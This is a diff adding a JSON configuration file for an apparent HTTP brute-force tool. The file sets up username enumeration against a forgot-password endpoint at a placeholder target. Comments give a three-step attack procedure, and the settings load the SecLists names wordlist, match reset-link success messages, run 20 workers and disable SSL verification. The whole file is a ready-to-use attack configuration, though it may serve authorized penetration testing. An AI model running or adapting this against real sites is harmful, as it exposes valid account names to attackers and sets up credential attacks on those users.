@@ -1,0 +1,47 @@
+{
+  "_comment": [
+    "Username enumeration via forgot-password endpoint.",
+    "Valid usernames often return a DIFFERENT response length or message.",
+    "Step 1: run --test first, note the response length for an invalid user.",
+    "Step 2: set length_not_equals to that baseline length.",
+    "Step 3: run the full attack — matches are valid usernames."
+  ],
+
+  "target":      "https://target.com",
+  "request":     "username_enum.txt",
+  "attack_mode": "battering_ram",
+
+  "payloads": {
+    "USER": {
+      "type": "file",
+      "path": "/usr/share/seclists/Usernames/Names/names.txt",
+      "test_value": "nonexistentuser_xyz"
+    }
+  },
+
+  "match": {
+    "status_codes":          [],
+    "response_contains":     ["email has been sent", "reset link", "check your inbox"],
+    "response_not_contains": [],
+    "length_not_equals":     null,
+    "_tip": "Set length_not_equals to the response size of an invalid username after running --test"
+  },
+
+  "stop": {
+    "on_first_match": false,
+    "max_matches":    0,
+    "max_requests":   0
+  },
+
+  "options": {
+    "workers":               20,
+    "timeout":               10,
+    "delay_ms":              50,
+    "follow_redirects":      false,
+    "verify_ssl":            false,
+    "update_content_length": true,
+    "save_matches_only":     true,
+    "save_response_body":    true,
+    "output":                "enum_results.jsonl"
+  }
+}
